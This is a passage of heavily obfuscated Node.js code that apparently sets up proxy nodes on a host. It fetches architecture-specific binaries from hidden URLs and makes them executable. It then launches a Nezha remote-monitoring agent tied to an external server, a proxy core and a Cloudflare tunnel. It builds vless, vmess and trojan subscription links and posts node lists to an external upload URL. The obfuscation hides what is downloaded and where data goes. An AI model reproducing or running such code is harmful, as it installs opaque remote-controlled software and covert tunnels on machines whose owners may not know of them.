            'MCkDM': function (_0x41b6d7, _0x16d42c) {
                return _0x41b6d7(_0x16d42c);
            }
        }, _0x2f6e5a = _0x288283[_0x2005f0(0xfb)](getSystemArchitecture), _0x27840b = _0x288283[_0x2005f0(0x2d1)](getFilesForArchitecture, _0x2f6e5a);
    if (_0x288283[_0x2005f0(0x15e)](_0x27840b[_0x2005f0(0x11c)], 0x11 * -0x5b + -0x20b1 + -0x9af * -0x4)) {
        console[_0x2005f0(0x14a)](_0x2005f0(0x2e3) + _0x2005f0(0x2db) + _0x2005f0(0x236) + _0x2005f0(0x326) + _0x2005f0(0x18b));
        return;
    }
    const _0x19fd8d = _0x27840b[_0x2005f0(0x22f)](_0x153892 => {
        const _0x4c2be1 = {
            'UPpQr': function (_0x25edc6, _0x58980f) {
                const _0x44a32e = _0x3d38;
                return _0x288283[_0x44a32e(0x247)](_0x25edc6, _0x58980f);
            },
            'lXaoM': function (_0x2983de, _0x2b7b42) {
                const _0x2b2781 = _0x3d38;
                return _0x288283[_0x2b2781(0x2d1)](_0x2983de, _0x2b7b42);
            }
        };
        return new Promise((_0xc2fc4b, _0x458147) => {
            const _0x44b8eb = _0x3d38;
            _0x288283[_0x44b8eb(0x110)](downloadFile, _0x153892[_0x44b8eb(0x2a3)], _0x153892[_0x44b8eb(0x20a)], (_0x3a46f7, _0x58539a) => {
                const _0x5f50e6 = _0x44b8eb;
                _0x3a46f7 ? _0x4c2be1[_0x5f50e6(0x1f5)](_0x458147, _0x3a46f7) : _0x4c2be1[_0x5f50e6(0x21e)](_0xc2fc4b, _0x58539a);
            });
        });
    });
    try {
        await Promise[_0x2005f0(0x337)](_0x19fd8d);
    } catch (_0xd1ba07) {
        console[_0x2005f0(0x180)](_0x288283[_0x2005f0(0x26d)], _0xd1ba07);
        return;
    }
    function _0x2a6448(_0x30378a) {
        const _0x3d27f3 = _0x2005f0, _0x59d8d4 = -0x1b * 0x15e + 0x1240 + -0x11 * -0x137;
        _0x30378a[_0x3d27f3(0x155)](_0x18d31d => {
            const _0x51f913 = _0x3d27f3;
            fs[_0x51f913(0x179)](_0x18d31d) && fs[_0x51f913(0x26f)](_0x18d31d, _0x59d8d4, _0x1b6c02 => {
                const _0x229d8f = _0x51f913;
                _0x1b6c02 ? console[_0x229d8f(0x180)](_0x229d8f(0x330) + _0x229d8f(0x197) + _0x229d8f(0x1d2) + _0x18d31d + ':\x20' + _0x1b6c02) : console[_0x229d8f(0x14a)](_0x229d8f(0x330) + _0x229d8f(0x1f6) + _0x229d8f(0x1ae) + _0x18d31d + ':\x20' + _0x59d8d4[_0x229d8f(0x102)](0x44 * 0x5 + -0x4 * -0xa0 + -0x3cc));
            });
        });
    }
    const _0x43eb45 = NEZHA_PORT ? [
        npmPath,
        webPath,
        botPath
    ] : [
        phpPath,
        webPath,
        botPath
    ];
    _0x288283[_0x2005f0(0x151)](_0x2a6448, _0x43eb45);
    if (_0x288283[_0x2005f0(0x1cd)](NEZHA_SERVER, NEZHA_KEY)) {
        if (!NEZHA_PORT) {
            const _0x54e65b = NEZHA_SERVER[_0x2005f0(0x2ab)](':') ? NEZHA_SERVER[_0x2005f0(0x18d)](':')[_0x2005f0(0x2a2)]() : '', _0x4356de = new Set([
                    _0x288283[_0x2005f0(0x17f)],
                    _0x288283[_0x2005f0(0x13d)],
                    _0x288283[_0x2005f0(0x24f)],
                    _0x288283[_0x2005f0(0x159)],
                    _0x288283[_0x2005f0(0x2b6)],
                    _0x288283[_0x2005f0(0x2cd)]
                ]), _0x244a4a = _0x4356de[_0x2005f0(0x231)](_0x54e65b) ? _0x288283[_0x2005f0(0x29f)] : _0x288283[_0x2005f0(0x1fd)], _0x392662 = _0x2005f0(0x1e7) + _0x2005f0(0x258) + NEZHA_KEY + (_0x2005f0(0x1a8) + _0x2005f0(0x15b) + _0x2005f0(0x2d9) + _0x2005f0(0x2b4) + _0x2005f0(0x2f5) + _0x2005f0(0x253) + _0x2005f0(0x206) + _0x2005f0(0x30a) + _0x2005f0(0x287) + _0x2005f0(0x324) + _0x2005f0(0x257) + _0x2005f0(0x250) + _0x2005f0(0x1d6) + _0x2005f0(0x175) + _0x2005f0(0x279) + _0x2005f0(0x1eb) + _0x2005f0(0x13f) + _0x2005f0(0x304) + _0x2005f0(0x2d4) + _0x2005f0(0x10e) + _0x2005f0(0x1d7) + _0x2005f0(0x28b)) + NEZHA_SERVER + (_0x2005f0(0x254) + _0x2005f0(0x20d) + _0x2005f0(0x18f) + _0x2005f0(0x16b) + _0x2005f0(0x105) + _0x2005f0(0x132) + _0x2005f0(0x32f) + _0x2005f0(0x182)) + _0x244a4a + (_0x2005f0(0x1bd) + _0x2005f0(0x1fb) + _0x2005f0(0x2e8) + _0x2005f0(0x289) + _0x2005f0(0x2f6) + _0x2005f0(0x31c) + _0x2005f0(0x323)) + UUID;
            fs[_0x2005f0(0x181) + _0x2005f0(0x1e2)](path[_0x2005f0(0x19d)](FILE_PATH, _0x288283[_0x2005f0(0x1e6)]), _0x392662);
            const _0x16a782 = _0x2005f0(0x274) + phpPath + _0x2005f0(0x309) + FILE_PATH + (_0x2005f0(0x128) + _0x2005f0(0x259) + _0x2005f0(0x2ef) + '&');
            try {
                await _0x288283[_0x2005f0(0x17e)](exec, _0x16a782), console[_0x2005f0(0x14a)](phpName + (_0x2005f0(0x1d3) + 'g')), await new Promise(_0x4259bf => setTimeout(_0x4259bf, 0x2 * 0xbb3 + 0x1b0 * 0x1 + -0x152e));
            } catch (_0x27ec63) {
                console[_0x2005f0(0x180)](_0x2005f0(0x1ed) + _0x2005f0(0x1cc) + _0x27ec63);
            }
        } else {
            let _0x2b8cdb = '';
            const _0x4310b0 = [
                _0x288283[_0x2005f0(0x17f)],
                _0x288283[_0x2005f0(0x13d)],
                _0x288283[_0x2005f0(0x24f)],
                _0x288283[_0x2005f0(0x159)],
                _0x288283[_0x2005f0(0x2b6)],
                _0x288283[_0x2005f0(0x2cd)]
            ];
            _0x4310b0[_0x2005f0(0x2ab)](NEZHA_PORT) && (_0x2b8cdb = _0x288283[_0x2005f0(0x226)]);
            const _0xbedfb5 = _0x2005f0(0x274) + npmPath + _0x2005f0(0x282) + NEZHA_SERVER + ':' + NEZHA_PORT + _0x2005f0(0x22c) + NEZHA_KEY + '\x20' + _0x2b8cdb + (_0x2005f0(0x1ee) + _0x2005f0(0x237) + _0x2005f0(0x118) + _0x2005f0(0x1dc) + _0x2005f0(0x29a) + _0x2005f0(0x18e) + _0x2005f0(0xfc) + _0x2005f0(0x1db) + '\x20&');
            try {
                await _0x288283[_0x2005f0(0x2d1)](exec, _0xbedfb5), console[_0x2005f0(0x14a)](npmName + (_0x2005f0(0x1d3) + 'g')), await new Promise(_0x18f003 => setTimeout(_0x18f003, 0x56 + -0xa2c + 0x6df * 0x2));
            } catch (_0x463f4f) {
                console[_0x2005f0(0x180)](_0x2005f0(0x1be) + _0x2005f0(0x1cc) + _0x463f4f);
            }
        }
    } else
        console[_0x2005f0(0x14a)](_0x288283[_0x2005f0(0x2c6)]);
    const _0x483b0d = _0x2005f0(0x274) + webPath + _0x2005f0(0x134) + FILE_PATH + (_0x2005f0(0x1a6) + _0x2005f0(0x29b) + _0x2005f0(0x22b));
    try {
        await _0x288283[_0x2005f0(0x217)](exec, _0x483b0d), console[_0x2005f0(0x14a)](webName + (_0x2005f0(0x1d3) + 'g')), await new Promise(_0xad00dd => setTimeout(_0xad00dd, -0xa35 + -0x1591 * -0x1 + -0x2 * 0x3ba));
    } catch (_0x2c4d14) {
        console[_0x2005f0(0x180)](_0x2005f0(0x164) + _0x2005f0(0x1cc) + _0x2c4d14);
    }
    if (fs[_0x2005f0(0x179)](botPath)) {
        let _0x356b26;
        if (ARGO_AUTH[_0x2005f0(0x1b3)](/^[A-Z0-9a-z=]{120,250}$/))
            _0x356b26 = _0x2005f0(0x28a) + _0x2005f0(0x16e) + _0x2005f0(0x19c) + _0x2005f0(0x137) + _0x2005f0(0x2af) + _0x2005f0(0x331) + _0x2005f0(0x267) + _0x2005f0(0x11a) + ARGO_AUTH;
        else
            ARGO_AUTH[_0x2005f0(0x1b3)](/TunnelSecret/) ? _0x356b26 = _0x2005f0(0x28a) + _0x2005f0(0x16e) + _0x2005f0(0x19c) + _0x2005f0(0x108) + FILE_PATH + (_0x2005f0(0x322) + _0x2005f0(0x18c)) : _0x356b26 = _0x2005f0(0x28a) + _0x2005f0(0x16e) + _0x2005f0(0x19c) + _0x2005f0(0x137) + _0x2005f0(0x2af) + _0x2005f0(0x331) + _0x2005f0(0x29c) + _0x2005f0(0x1b9) + FILE_PATH + (_0x2005f0(0x2cf) + _0x2005f0(0x230) + _0x2005f0(0x27f) + _0x2005f0(0x1f3) + _0x2005f0(0x1ca)) + ARGO_PORT;
        try {
            await _0x288283[_0x2005f0(0x31d)](exec, _0x2005f0(0x274) + botPath + '\x20' + _0x356b26 + (_0x2005f0(0x12a) + _0x2005f0(0x2b1))), console[_0x2005f0(0x14a)](botName + (_0x2005f0(0x1d3) + 'g')), await new Promise(_0x1556ec => setTimeout(_0x1556ec, -0xed9 * -0x1 + 0x1 * 0x1b7d + -0x3 * 0xb82));
        } catch (_0x4e3a3d) {
            console[_0x2005f0(0x180)](_0x2005f0(0x21b) + _0x2005f0(0x2b9) + _0x2005f0(0x2a8) + _0x4e3a3d);
        }
    }
    await new Promise(_0x2483b9 => setTimeout(_0x2483b9, -0x1c53 + 0x157e + 0x1a5d));
}
function getFilesForArchitecture(_0x24140d) {
    const _0x261c94 = _0x3595c8, _0x3be621 = {
            'EwwAq': function (_0x3e293f, _0x4e96df) {
                return _0x3e293f === _0x4e96df;
            },
            'DeaoK': _0x261c94(0x1ec),
            'APBTT': _0x261c94(0x335) + _0x261c94(0x2a9) + _0x261c94(0x15c),
            'SLBTy': _0x261c94(0x335) + _0x261c94(0x2a9) + _0x261c94(0x100),
            'wnSUl': _0x261c94(0x156) + _0x261c94(0x23e) + _0x261c94(0x15c),
            'zltoh': _0x261c94(0x156) + _0x261c94(0x23e) + _0x261c94(0x100),
            'iniCb': function (_0xf99e8, _0x134860) {
                return _0xf99e8 && _0x134860;
            },
            'CkFgl': _0x261c94(0x335) + _0x261c94(0x2a9) + _0x261c94(0x1d4) + 't',
            'dnesW': _0x261c94(0x156) + _0x261c94(0x23e) + _0x261c94(0x1d4) + 't',
            'QBaRb': function (_0xfc95ba, _0x124ed0) {
                return _0xfc95ba === _0x124ed0;
            },
            'REGfd': _0x261c94(0x335) + _0x261c94(0x2a9) + _0x261c94(0x299),
            'oxaoQ': _0x261c94(0x156) + _0x261c94(0x23e) + _0x261c94(0x299)
        };
    let _0x2e17dd;
    _0x3be621[_0x261c94(0x166)](_0x24140d, _0x3be621[_0x261c94(0x2f9)]) ? _0x2e17dd = [
        {
            'fileName': webPath,
            'fileUrl': _0x3be621[_0x261c94(0x2a6)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x3be621[_0x261c94(0x26b)]
        }
    ] : _0x2e17dd = [
        {
            'fileName': webPath,
            'fileUrl': _0x3be621[_0x261c94(0x129)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x3be621[_0x261c94(0x293)]
        }
    ];
    if (_0x3be621[_0x261c94(0x2ac)](NEZHA_SERVER, NEZHA_KEY)) {
        if (NEZHA_PORT) {
            const _0x3d2d20 = _0x3be621[_0x261c94(0x166)](_0x24140d, _0x3be621[_0x261c94(0x2f9)]) ? _0x3be621[_0x261c94(0x167)] : _0x3be621[_0x261c94(0x246)];
            _0x2e17dd[_0x261c94(0x12d)]({
                'fileName': npmPath,
                'fileUrl': _0x3d2d20
            });
        } else {
            const _0x2535ad = _0x3be621[_0x261c94(0x28e)](_0x24140d, _0x3be621[_0x261c94(0x2f9)]) ? _0x3be621[_0x261c94(0x313)] : _0x3be621[_0x261c94(0x32b)];
            _0x2e17dd[_0x261c94(0x12d)]({
                'fileName': phpPath,
                'fileUrl': _0x2535ad
            });
        }
    }
    return _0x2e17dd;
}
function argoType() {
    const _0x23368a = _0x3595c8, _0x159736 = {
            'Chzsb': function (_0xbd1f06, _0x1dc88b) {
                return _0xbd1f06 || _0x1dc88b;
            },
            'PVkvf': _0x23368a(0x189) + _0x23368a(0x2c7) + _0x23368a(0x135) + _0x23368a(0x1ab) + _0x23368a(0x1f2) + _0x23368a(0x2f8) + 's',
            'FOGtG': _0x23368a(0x17c) + 'et',
            'yhqmc': _0x23368a(0x162) + 'n',
            'ORgTa': _0x23368a(0x285),
            'vyBJq': _0x23368a(0x1b4) + _0x23368a(0x1f7) + _0x23368a(0x114) + _0x23368a(0x261) + _0x23368a(0x332) + _0x23368a(0x1e9)
        };
    if (_0x159736[_0x23368a(0x325)](!ARGO_AUTH, !ARGO_DOMAIN)) {
        console[_0x23368a(0x14a)](_0x159736[_0x23368a(0x30e)]);
        return;
    }
    if (ARGO_AUTH[_0x23368a(0x2ab)](_0x159736[_0x23368a(0x31e)])) {
        fs[_0x23368a(0x181) + _0x23368a(0x1e2)](path[_0x23368a(0x19d)](FILE_PATH, _0x159736[_0x23368a(0x16a)]), ARGO_AUTH);
        const _0x33ec87 = _0x23368a(0x1fe) + '\x20' + ARGO_AUTH[_0x23368a(0x18d)]('\x22')[0x7 * -0x1f + 0x9 * -0x1d9 + 0x1185] + (_0x23368a(0x190) + _0x23368a(0x2fa) + '\x20') + path[_0x23368a(0x19d)](FILE_PATH, _0x159736[_0x23368a(0x16a)]) + (_0x23368a(0x2c5) + _0x23368a(0x1f9) + _0x23368a(0x14c) + _0x23368a(0x270) + _0x23368a(0x1a5)) + ARGO_DOMAIN + (_0x23368a(0x2ba) + _0x23368a(0x13c) + _0x23368a(0x31f) + _0x23368a(0x29d)) + ARGO_PORT + (_0x23368a(0x1a3) + _0x23368a(0x199) + _0x23368a(0x2d8) + _0x23368a(0x1c1) + _0x23368a(0x2c0) + _0x23368a(0x1fc) + _0x23368a(0x2ff) + _0x23368a(0x24c) + '\x20');
        fs[_0x23368a(0x181) + _0x23368a(0x1e2)](path[_0x23368a(0x19d)](FILE_PATH, _0x159736[_0x23368a(0x319)]), _0x33ec87);
    } else
        console[_0x23368a(0x14a)](_0x159736[_0x23368a(0x221)]);
}
async function extractDomains() {
    const _0x3d54f2 = _0x3595c8, _0x43b374 = {
            'xonaT': function (_0x5ed866, _0x46b29d) {
                return _0x5ed866 === _0x46b29d;
            },
            'mEtmi': _0x3d54f2(0x32a),
            'eqmoQ': function (_0x92db22, _0x3d2ab5) {
                return _0x92db22(_0x3d2ab5);
            },
            'NiQYQ': _0x3d54f2(0x265) + _0x3d54f2(0x1ce) + 'n',
            'NxFQe': _0x3d54f2(0x22a) + _0x3d54f2(0x1a1) + 'on',
            'AmehK': function (_0x22d888, _0x311a56) {
                return _0x22d888 === _0x311a56;
            },
            'hBoLh': _0x3d54f2(0x19a),
            'sSvvz': _0x3d54f2(0x1c4),
            'sSNmK': _0x3d54f2(0x232),
            'gekHm': _0x3d54f2(0x12f) + 'pe',
            'WjMil': _0x3d54f2(0x2ce) + _0x3d54f2(0x306) + _0x3d54f2(0x27c),
            'IcYzP': _0x3d54f2(0x2b3),
            'vaFnf': _0x3d54f2(0x16f) + _0x3d54f2(0x234),
            'PCnnN': _0x3d54f2(0x317),
            'BLkqb': _0x3d54f2(0x214),
            'coEIL': function (_0x4cb576) {
                return _0x4cb576();
            },
            'SCiZF': function (_0xb04660, _0x462275, _0x451d91) {
                return _0xb04660(_0x462275, _0x451d91);
            },
            'AqFQt': function (_0x2ffdba) {
                return _0x2ffdba();
            },
            'oJSXI': function (_0x5a6e1d, _0x3a2f98) {
                return _0x5a6e1d && _0x3a2f98;
            },
            'EVhHj': _0x3d54f2(0x189) + 'N:',
            'hpTsO': _0x3d54f2(0x263),
            'cOBTn': _0x3d54f2(0x27c),
            'BMeji': function (_0x4f7061, _0x100884) {
                return _0x4f7061 > _0x100884;
            },
            'xwMaf': _0x3d54f2(0x2e6) + ':',
            'UAkZc': _0x3d54f2(0x2e6) + _0x3d54f2(0x123) + _0x3d54f2(0x1d8) + _0x3d54f2(0x1b8) + _0x3d54f2(0x154) + _0x3d54f2(0x2a7),
            'YvEDI': function (_0x32bd21, _0x5d4a28) {
                return _0x32bd21(_0x5d4a28);
            },
            'jHYuh': function (_0x168366) {
                return _0x168366();
            },
            'LSlTl': _0x3d54f2(0x210) + _0x3d54f2(0x1b0) + _0x3d54f2(0x24b)
        };
    let _0x167bc6;
    if (_0x43b374[_0x3d54f2(0x20c)](ARGO_AUTH, ARGO_DOMAIN))
        _0x167bc6 = ARGO_DOMAIN, console[_0x3d54f2(0x14a)](_0x43b374[_0x3d54f2(0x1d9)], _0x167bc6), await _0x43b374[_0x3d54f2(0x1d0)](_0x5027fd, _0x167bc6);
    else
        try {
            const _0x213ef4 = fs[_0x3d54f2(0x15f) + 'nc'](path[_0x3d54f2(0x19d)](FILE_PATH, _0x43b374[_0x3d54f2(0x2ca)]), _0x43b374[_0x3d54f2(0x218)]), _0x2a1d3d = _0x213ef4[_0x3d54f2(0x18d)]('\x0a'), _0x416fa2 = [];
            _0x2a1d3d[_0x3d54f2(0x155)](_0x5a8dd7 => {
                const _0x5be8c7 = _0x3d54f2, _0x2f7c98 = _0x5a8dd7[_0x5be8c7(0x1b3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x2f7c98) {
                    const _0x39f810 = _0x2f7c98[0x2 * 0x18e + 0x10f * 0x1c + 0x20bf * -0x1];
                    _0x416fa2[_0x5be8c7(0x2fc)](_0x39f810);
                }
            });
            if (_0x43b374[_0x3d54f2(0x1bf)](_0x416fa2[_0x3d54f2(0x11c)], -0x931 * -0x1 + 0x2b9 + 0x32 * -0x3d))
                _0x167bc6 = _0x416fa2[-0x2ce * -0x6 + -0x5f1 + -0xae3], console[_0x3d54f2(0x14a)](_0x43b374[_0x3d54f2(0x150)], _0x167bc6), await _0x43b374[_0x3d54f2(0x1d0)](_0x5027fd, _0x167bc6);
            else {
                console[_0x3d54f2(0x14a)](_0x43b374[_0x3d54f2(0x2d7)]), fs[_0x3d54f2(0x14e)](path[_0x3d54f2(0x19d)](FILE_PATH, _0x43b374[_0x3d54f2(0x2ca)]));
                async function _0x16d0dd() {
                    const _0x308d7d = _0x3d54f2;
                    try {
                        _0x43b374[_0x308d7d(0x2f4)](process[_0x308d7d(0x30f)], _0x43b374[_0x308d7d(0x120)]) ? await _0x43b374[_0x308d7d(0x1d0)](exec, _0x308d7d(0x1c7) + _0x308d7d(0x23a) + botName + (_0x308d7d(0x2b0) + _0x308d7d(0x17b))) : await _0x43b374[_0x308d7d(0x1d0)](exec, _0x308d7d(0x283) + '[' + botName[_0x308d7d(0x13a)](-0x1305 + 0x660 + 0x3 * 0x437) + ']' + botName[_0x308d7d(0x1a2)](-0x1527 + -0x2 * 0x11a4 + -0x4 * -0xe1c) + (_0x308d7d(0x2f7) + _0x308d7d(0x177)));
                    } catch (_0x43ec83) {
                    }
                }
                _0x43b374[_0x3d54f2(0x2cc)](_0x16d0dd), await new Promise(_0x35977d => setTimeout(_0x35977d, -0x916 + 0x13ed * -0x1 + 0x28bb));
                const _0x2d5724 = _0x3d54f2(0x28a) + _0x3d54f2(0x16e) + _0x3d54f2(0x19c) + _0x3d54f2(0x137) + _0x3d54f2(0x2af) + _0x3d54f2(0x331) + _0x3d54f2(0x29c) + _0x3d54f2(0x1b9) + FILE_PATH + (_0x3d54f2(0x2cf) + _0x3d54f2(0x230) + _0x3d54f2(0x27f) + _0x3d54f2(0x1f3) + _0x3d54f2(0x1ca)) + ARGO_PORT;
                try {
                    await _0x43b374[_0x3d54f2(0x10c)](exec, _0x3d54f2(0x274) + botPath + '\x20' + _0x2d5724 + (_0x3d54f2(0x12a) + _0x3d54f2(0x2b1))), console[_0x3d54f2(0x14a)](botName + (_0x3d54f2(0x1d3) + 'g')), await new Promise(_0x4fc84c => setTimeout(_0x4fc84c, -0x1795 * -0x1 + 0xf2 * -0x1 + -0xaeb)), await _0x43b374[_0x3d54f2(0x12b)](extractDomains);
                } catch (_0x4a5e05) {
                    console[_0x3d54f2(0x180)](_0x3d54f2(0x21b) + _0x3d54f2(0x2b9) + _0x3d54f2(0x2a8) + _0x4a5e05);
                }
            }
        } catch (_0x4a3cb4) {
            console[_0x3d54f2(0x180)](_0x43b374[_0x3d54f2(0x31a)], _0x4a3cb4);
        }
    async function _0x533e0c() {
        const _0x1b0d62 = _0x3d54f2;
        try {
            const _0x2d66f0 = await axios[_0x1b0d62(0x1c3)](_0x43b374[_0x1b0d62(0x193)], { 'timeout': 0xbb8 });
            if (_0x2d66f0[_0x1b0d62(0x1c8)] && _0x2d66f0[_0x1b0d62(0x1c8)][_0x1b0d62(0x184) + 'de'] && _0x2d66f0[_0x1b0d62(0x1c8)][_0x1b0d62(0x252)])
                return _0x2d66f0[_0x1b0d62(0x1c8)][_0x1b0d62(0x184) + 'de'] + '_' + _0x2d66f0[_0x1b0d62(0x1c8)][_0x1b0d62(0x252)];
        } catch (_0x1d6fc7) {
            try {
                const _0x4fb442 = await axios[_0x1b0d62(0x1c3)](_0x43b374[_0x1b0d62(0x300)], { 'timeout': 0xbb8 });
                if (_0x4fb442[_0x1b0d62(0x1c8)] && _0x43b374[_0x1b0d62(0x2fb)](_0x4fb442[_0x1b0d62(0x1c8)][_0x1b0d62(0x15d)], _0x43b374[_0x1b0d62(0x280)]) && _0x4fb442[_0x1b0d62(0x1c8)][_0x1b0d62(0x27a) + 'e'] && _0x4fb442[_0x1b0d62(0x1c8)][_0x1b0d62(0x252)])
                    return _0x4fb442[_0x1b0d62(0x1c8)][_0x1b0d62(0x27a) + 'e'] + '_' + _0x4fb442[_0x1b0d62(0x1c8)][_0x1b0d62(0x252)];
            } catch (_0x4300d0) {
            }
        }
        return _0x43b374[_0x1b0d62(0x10d)];
    }
    async function _0x5027fd(_0xd7e253) {
        const _0x1658a = _0x3d54f2, _0x124e98 = await _0x43b374[_0x1658a(0x2cc)](_0x533e0c), _0x549f5d = NAME ? NAME + '-' + _0x124e98 : _0x124e98;
        return new Promise(_0xcb161d => {
            const _0x4245e5 = _0x1658a, _0xe9e71 = {
                    'TeXyd': _0x43b374[_0x4245e5(0x1c9)],
                    'JlrbE': _0x43b374[_0x4245e5(0x17a)],
                    'wZrZN': _0x43b374[_0x4245e5(0x298)],
                    'JKRfd': _0x43b374[_0x4245e5(0x28f)],
                    'UdAtp': _0x43b374[_0x4245e5(0x112)],
                    'BqhUE': _0x43b374[_0x4245e5(0x1cb)],
                    'ztmkX': _0x43b374[_0x4245e5(0x2e5)],
                    'qHEun': function (_0x6316a6) {
                        const _0x59be27 = _0x4245e5;
                        return _0x43b374[_0x59be27(0x20f)](_0x6316a6);
                    },
                    'SGIQg': function (_0x31454e, _0x13f326) {
                        const _0x6c3515 = _0x4245e5;
                        return _0x43b374[_0x6c3515(0x1d0)](_0x31454e, _0x13f326);
                    }
                };
            _0x43b374[_0x4245e5(0x163)](setTimeout, () => {
                const _0x22e8c3 = _0x4245e5, _0x25a9f6 = {
                        'FPwao': _0xe9e71[_0x22e8c3(0x147)],
                        'hmgUf': _0xe9e71[_0x22e8c3(0x2de)],
                        'bWXZA': _0xe9e71[_0x22e8c3(0x1c0)]
                    }, _0x2f64d7 = {
                        'v': '2',
                        'ps': '' + _0x549f5d,
                        'add': CFIP,
                        'port': CFPORT,
                        'id': UUID,
                        'aid': '0',
                        'scy': _0xe9e71[_0x22e8c3(0x1a7)],
                        'net': 'ws',
                        'type': _0xe9e71[_0x22e8c3(0x1a7)],
                        'host': _0xd7e253,
                        'path': _0xe9e71[_0x22e8c3(0x20e)],
                        'tls': _0xe9e71[_0x22e8c3(0x1d5)],
                        'sni': _0xd7e253,
                        'alpn': '',
                        'fp': _0xe9e71[_0x22e8c3(0x116)]
                    }, _0xe93cf6 = _0x22e8c3(0x264) + UUID + '@' + CFIP + ':' + CFPORT + (_0x22e8c3(0x149) + _0x22e8c3(0x14d) + _0x22e8c3(0x1ba) + _0x22e8c3(0x28d)) + _0xd7e253 + (_0x22e8c3(0x235) + _0x22e8c3(0x286) + _0x22e8c3(0x10a)) + _0xd7e253 + (_0x22e8c3(0x2f2) + _0x22e8c3(0x1ad) + _0x22e8c3(0x131) + '0#') + _0x549f5d + _0x22e8c3(0x278) + Buffer[_0x22e8c3(0x2cb)](JSON[_0x22e8c3(0x328)](_0x2f64d7))[_0x22e8c3(0x102)](_0xe9e71[_0x22e8c3(0x147)]) + (_0x22e8c3(0x1c6) + '/') + UUID + '@' + CFIP + ':' + CFPORT + (_0x22e8c3(0x21f) + _0x22e8c3(0x1b5)) + _0xd7e253 + (_0x22e8c3(0x235) + _0x22e8c3(0x286) + _0x22e8c3(0x10a)) + _0xd7e253 + (_0x22e8c3(0x202) + _0x22e8c3(0x207) + _0x22e8c3(0x1ff) + _0x22e8c3(0x19e)) + _0x549f5d + _0x22e8c3(0x18a);
                console[_0x22e8c3(0x14a)](Buffer[_0x22e8c3(0x2cb)](_0xe93cf6)[_0x22e8c3(0x102)](_0xe9e71[_0x22e8c3(0x147)])), fs[_0x22e8c3(0x181) + _0x22e8c3(0x1e2)](subPath, Buffer[_0x22e8c3(0x2cb)](_0xe93cf6)[_0x22e8c3(0x102)](_0xe9e71[_0x22e8c3(0x147)])), console[_0x22e8c3(0x14a)](FILE_PATH + (_0x22e8c3(0x14b) + _0x22e8c3(0x142) + _0x22e8c3(0x152))), _0xe9e71[_0x22e8c3(0x241)](uploadNodes), app[_0x22e8c3(0x1c3)]('/' + SUB_PATH, (_0xf63edc, _0x465031) => {
                    const _0x167ee2 = _0x22e8c3, _0x1ac540 = Buffer[_0x167ee2(0x2cb)](_0xe93cf6)[_0x167ee2(0x102)](_0x25a9f6[_0x167ee2(0x22e)]);
                    _0x465031[_0x167ee2(0x2ae)](_0x25a9f6[_0x167ee2(0x21d)], _0x25a9f6[_0x167ee2(0x227)]), _0x465031[_0x167ee2(0x17d)](_0x1ac540);
                }), _0xe9e71[_0x22e8c3(0x106)](_0xcb161d, _0xe93cf6);
            }, 0x469 + 0x2 * -0x266 + 0x833 * 0x1);
        });
    }
}
function _0x3d38(_0x65784e, _0x1ed650) {
    const _0x2ea449 = _0x6f9e();
    return _0x3d38 = function (_0x17fcdd, _0x4b60ae) {
        _0x17fcdd = _0x17fcdd - (0x14e + -0x7 * -0x3d7 + -0x1 * 0x1b34);
        let _0x117f42 = _0x2ea449[_0x17fcdd];
        return _0x117f42;
    }, _0x3d38(_0x65784e, _0x1ed650);
}
async function uploadNodes() {
    const _0x1c6a04 = _0x3595c8, _0x1e694b = {
            'aHPbF': function (_0x51d868, _0xc932d3) {
                return _0x51d868 && _0xc932d3;
            },
            'EbkkL': _0x1c6a04(0x320) + _0x1c6a04(0x124),
            'NYHjz': function (_0xd9049d, _0x4d16f7) {
                return _0xd9049d === _0x4d16f7;
            },
            'LFZOW': _0x1c6a04(0x303) + _0x1c6a04(0x2bf) + _0x1c6a04(0x19f) + _0x1c6a04(0x1fa),
            'QocVy': function (_0x277d58, _0x188268) {
                return _0x277d58 === _0x188268;
            },
            'PvFRe': _0x1c6a04(0x27c),
            'evbVS': function (_0x261913, _0x53f4ce) {
                return _0x261913 === _0x53f4ce;
            },
            'nFjWK': function (_0x3c05af, _0x324fce) {
                return _0x3c05af === _0x324fce;
            },
            'obpuK': _0x1c6a04(0x209) + _0x1c6a04(0x27b) + _0x1c6a04(0x152)
        };
    if (_0x1e694b[_0x1c6a04(0x2e1)](UPLOAD_URL, PROJECT_URL)) {
        const _0x3cf2b1 = PROJECT_URL + '/' + SUB_PATH, _0x4cddc4 = { 'subscription': [_0x3cf2b1] };
        try {
            const _0x5486a7 = await axios[_0x1c6a04(0x1b1)](UPLOAD_URL + (_0x1c6a04(0x160) + _0x1c6a04(0x310) + 'ns'), _0x4cddc4, { 'headers': { 'Content-Type': _0x1e694b[_0x1c6a04(0x187)] } });
            return _0x5486a7 && _0x1e694b[_0x1c6a04(0x203)](_0x5486a7[_0x1c6a04(0x15d)], -0x43 * -0x5a + 0x5 * 0xa9 + -0x19 * 0x10b) ? (console[_0x1c6a04(0x14a)](_0x1e694b[_0x1c6a04(0x11e)]), _0x5486a7) : null;
        } catch (_0x4caa07) {
            if (_0x4caa07[_0x1c6a04(0x32c)]) {
                if (_0x1e694b[_0x1c6a04(0x311)](_0x4caa07[_0x1c6a04(0x32c)][_0x1c6a04(0x15d)], 0x1837 * -0x1 + 0x1a71 + -0x55 * 0x2)) {
                }
            }
        }
    } else {
        if (UPLOAD_URL) {
            if (!fs[_0x1c6a04(0x179)](listPath))
                return;
            const _0x22386c = fs[_0x1c6a04(0x15f) + 'nc'](listPath, _0x1e694b[_0x1c6a04(0x1c2)]), _0x19b0ea = _0x22386c[_0x1c6a04(0x18d)]('\x0a')[_0x1c6a04(0x312)](_0x51ba6e => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1c6a04(0x101)](_0x51ba6e));
            if (_0x1e694b[_0x1c6a04(0x2bc)](_0x19b0ea[_0x1c6a04(0x11c)], 0x1422 + -0xb56 + -0x8cc))
                return;
            const _0x3c88b5 = JSON[_0x1c6a04(0x328)]({ 'nodes': _0x19b0ea });
            try {
                const _0x2e1351 = await axios[_0x1c6a04(0x1b1)](UPLOAD_URL + (_0x1c6a04(0x2d3) + _0x1c6a04(0x229)), _0x3c88b5, { 'headers': { 'Content-Type': _0x1e694b[_0x1c6a04(0x187)] } });
